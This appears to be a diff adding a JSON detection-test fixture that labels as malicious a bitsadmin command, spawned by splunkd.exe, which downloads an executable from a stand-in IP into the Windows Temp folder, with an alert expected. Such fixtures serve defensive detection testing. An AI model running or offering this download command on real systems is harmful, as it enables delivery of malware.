@@ -1,0 +1,7 @@
+{
+  "label": "malicious",
+  "ParentBaseFileName": "splunkd.exe",
+  "ImageFileName": "C:\\\\Windows\\\\System32\\\\bitsadmin.exe",
+  "CommandLine": "bitsadmin /transfer n http://203.0.113.5/a.exe C:\\\\Windows\\\\Temp\\\\a.exe",
+  "expect_alert": true
+}
